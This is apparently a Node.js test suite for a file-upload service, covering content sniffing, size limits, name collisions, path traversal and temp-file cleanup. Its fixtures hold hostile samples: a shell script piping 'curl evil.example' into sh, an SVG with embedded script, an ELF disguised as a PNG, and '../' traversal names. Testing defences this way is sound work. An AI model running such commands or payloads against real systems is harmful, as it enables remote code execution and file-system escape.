import { test, describe, before, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';

import { TEMP_PREFIX, UploadService } from '../server/upload-service.js';
import { UploadError } from '../server/errors.js';

let root;

/** A PNG header followed by `size` bytes of filler. */
function png(size = 1024) {
  const head = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  return Buffer.concat([head, Buffer.alloc(Math.max(0, size - head.length), 0x41)]);
}

const streamOf = (buffer) => Readable.from([buffer]);

/** What is on disk, ignoring anything still in flight. */
async function listed() {
  const entries = await fs.readdir(root);
  return entries.filter((name) => !name.startsWith(TEMP_PREFIX)).sort();
}

async function temps() {
  return (await fs.readdir(root)).filter((name) => name.startsWith(TEMP_PREFIX));
}

before(async () => {
  root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'ddp-')));
});
after(async () => {
  await fs.rm(root, { recursive: true, force: true });
});
beforeEach(async () => {
  for (const name of await fs.readdir(root)) {
    await fs.rm(path.join(root, name), { recursive: true, force: true });
  }
});

describe('store: the happy path', () => {
  test('a real image lands under its own name', async () => {
    const service = new UploadService({ root });
    const stored = await service.store('photo.png', streamOf(png()));

    assert.equal(stored.name, 'photo.png');
    assert.equal(stored.type, 'image/png');
    assert.equal(stored.size, 1024);
    assert.deepEqual(await listed(), ['photo.png']);
  });

  test('a directory path in the name is trimmed to its last segment', async () => {
    const service = new UploadService({ root });
    const stored = await service.store('albums/2026/photo.png', streamOf(png()));
    assert.equal(stored.name, 'photo.png');
    assert.deepEqual(await listed(), ['photo.png']);
  });

  test('a file smaller than the sniff window is still identified', async () => {
    const service = new UploadService({ root });
    const stored = await service.store('tiny.png', streamOf(png(12)));
    assert.equal(stored.type, 'image/png');
  });

  test('no temporary file is left behind', async () => {
    const service = new UploadService({ root });
    await service.store('photo.png', streamOf(png()));
    assert.deepEqual(await temps(), []);
  });
});

describe('store: what the bytes say beats what the name says', () => {
  test('an executable called .png is refused', async () => {
    const service = new UploadService({ root });
    const elf = Buffer.concat([
      Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]),
      Buffer.alloc(512),
    ]);
    await assert.rejects(
      service.store('totally-a-photo.png', streamOf(elf)),
      (err) => err instanceof UploadError && err.code === 'NOT_AN_IMAGE'
    );
    // The decisive check: nothing reached the disk, not even a temp file.
    assert.deepEqual(await listed(), []);
    assert.deepEqual(await temps(), []);
  });

  test('a shell script called .jpg is refused', async () => {
    const service = new UploadService({ root });
    const script = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n');
    await assert.rejects(
      service.store('holiday.jpg', streamOf(script)),
      (err) => err.code === 'NOT_AN_IMAGE'
    );
    assert.deepEqual(await listed(), []);
  });

  test('a type outside the accept list is refused by type, not by extension', async () => {
    const service = new UploadService({ root, accept: ['image/jpeg'] });
    await assert.rejects(
      service.store('photo.jpg', streamOf(png())),
      (err) => err.code === 'TYPE_NOT_ALLOWED' && err.params.type === 'image/png'
    );
    assert.deepEqual(await listed(), []);
  });
});

describe('store: SVG is opt-in', () => {
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');

  test('refused by default', async () => {
    const service = new UploadService({ root });
    await assert.rejects(
      service.store('logo.svg', streamOf(svg)),
      (err) => err.code === 'TYPE_NOT_ALLOWED'
    );
    assert.deepEqual(await listed(), []);
  });

  test('accepted when the host asked for it', async () => {
    const service = new UploadService({ root, allowSvg: true });
    const stored = await service.store('logo.svg', streamOf(svg));
    assert.equal(stored.type, 'image/svg+xml');
    assert.deepEqual(await listed(), ['logo.svg']);
  });
});

describe('store: limits', () => {
  test('a file over the cap is refused and leaves nothing behind', async () => {
    const service = new UploadService({ root, limits: { maxFileSize: 2048 } });
    await assert.rejects(
      service.store('big.png', streamOf(png(8192))),
      (err) => err.code === 'TOO_LARGE' && err.params.limit === 2048
    );
    assert.deepEqual(await listed(), []);
    assert.deepEqual(await temps(), []);
  });

  test('the cap counts bytes received, not a declared length', async () => {
    // The stream announces nothing at all; the guard still has to stop it.
    const service = new UploadService({ root, limits: { maxFileSize: 4096 } });
    const chunks = [png(64), ...Array.from({ length: 200 }, () => Buffer.alloc(256, 0x42))];
    await assert.rejects(
      service.store('sneaky.png', Readable.from(chunks)),
      (err) => err.code === 'TOO_LARGE'
    );
    assert.deepEqual(await listed(), []);
  });

  test('an empty file is refused', async () => {
    const service = new UploadService({ root });
    await assert.rejects(
      service.store('nothing.png', streamOf(Buffer.alloc(0))),
      (err) => err.code === 'EMPTY' || err.code === 'NOT_AN_IMAGE'
    );
    assert.deepEqual(await listed(), []);
  });
});

describe('store: name collisions', () => {
  test('renamed by default, so nothing is silently replaced', async () => {
    const service = new UploadService({ root });
    await service.store('photo.png', streamOf(png()));
    const second = await service.store('photo.png', streamOf(png(2048)));

    assert.equal(second.name, 'photo (2).png');
    assert.deepEqual(await listed(), ['photo (2).png', 'photo.png']);
    // The first file is untouched.
    assert.equal((await fs.stat(path.join(root, 'photo.png'))).size, 1024);
  });

  test('refused when the host asked for that', async () => {
    const service = new UploadService({ root, onConflict: 'refuse' });
    await service.store('photo.png', streamOf(png()));
    await assert.rejects(
      service.store('photo.png', streamOf(png())),
      (err) => err.code === 'EXISTS'
    );
    assert.deepEqual(await listed(), ['photo.png']);
  });

  test('overwritten when the host asked for that', async () => {
    const service = new UploadService({ root, onConflict: 'overwrite' });
    await service.store('photo.png', streamOf(png(1024)));
    await service.store('photo.png', streamOf(png(4096)));
    assert.deepEqual(await listed(), ['photo.png']);
    assert.equal((await fs.stat(path.join(root, 'photo.png'))).size, 4096);
  });

  test('two uploads racing for one name both survive', async () => {
    // The name is claimed with `wx`, so "is it free" and "take it" are one
    // operation; checking first would let both pass and one overwrite the other.
    const service = new UploadService({ root });
    await Promise.all([
      service.store('same.png', streamOf(png(1024))),
      service.store('same.png', streamOf(png(2048))),
      service.store('same.png', streamOf(png(3072))),
    ]);
    const names = await listed();
    assert.equal(names.length, 3, `expected three files, got ${names.join(', ')}`);
    const sizes = [];
    for (const name of names) sizes.push((await fs.stat(path.join(root, name))).size);
    assert.deepEqual(sizes.sort((a, b) => a - b), [1024, 2048, 3072]);
  });
});

describe('store: nothing escapes the root', () => {
  test('a traversal name is refused before anything is opened', async () => {
    const service = new UploadService({ root });
    for (const name of ['../escaped.png', '..\\escaped.png', 'a/../../escaped.png']) {
      await assert.rejects(service.store(name, streamOf(png())), UploadError);
    }
    await assert.rejects(fs.stat(path.join(root, '..', 'escaped.png')));
    assert.deepEqual(await listed(), []);
  });

  test('a rename hook cannot put the file somewhere else either', async () => {
    const service = new UploadService({ root, rename: () => '../../escaped.png' });
    await assert.rejects(service.store('photo.png', streamOf(png())), UploadError);
    assert.deepEqual(await listed(), []);
  });
});

describe('store: a host-chosen name', () => {
  test('the hook decides what it is called on disk', async () => {
    const service = new UploadService({
      root,
      rename: (name, meta) => `fixed-${meta.type.split('/')[1]}.bin`,
    });
    const stored = await service.store('whatever.png', streamOf(png()));
    assert.equal(stored.name, 'fixed-png.bin');
  });
});

describe('sweepTemp', () => {
  test('removes leftovers from an interrupted process, and only those', async () => {
    const service = new UploadService({ root });
    await service.init();
    await fs.writeFile(path.join(root, `${TEMP_PREFIX}stale`), 'x');
    await fs.writeFile(path.join(root, 'keep.png'), 'x');

    assert.equal(await service.sweepTemp(-1), 1);
    assert.deepEqual(await listed(), ['keep.png']);
  });
});

describe('free space', () => {
  test('an upload is refused before it is written when the disk is nearly full', async () => {
    // A ceiling no volume can satisfy stands in for a full disk.
    const service = new UploadService({ root, limits: { minFreeSpace: Number.MAX_SAFE_INTEGER } });
    const err = await service.store('a.png', streamOf(png(512))).then(() => null, (e) => e);

    assert.ok(err instanceof UploadError);
    assert.equal(err.code, 'NO_SPACE');
    assert.equal(err.status, 507);
    assert.deepEqual(await listed(), [], 'the file was written despite the refusal');
    assert.deepEqual(await temps(), []);
  });

  test('the check is skipped rather than failing everything when it is turned off', async () => {
    const service = new UploadService({ root, limits: { minFreeSpace: 0 } });
    const stored = await service.store('a.png', streamOf(png(512)));
    assert.equal(stored.name, 'a.png');
  });
});

describe('a directory already full of that name', () => {
  test('gives up with a 409 instead of trying for ever', async () => {
    const service = new UploadService({ root });
    await fs.writeFile(path.join(root, 'photo.png'), 'x');
    for (let i = 2; i <= 101; i += 1) {
      await fs.writeFile(path.join(root, `photo (${i}).png`), 'x');
    }

    const err = await service.store('photo.png', streamOf(png(512))).then(() => null, (e) => e);
    assert.ok(err instanceof UploadError);
    assert.equal(err.status, 409);
    assert.deepEqual(await temps(), [], 'the temp file survived the refusal');
  });
});
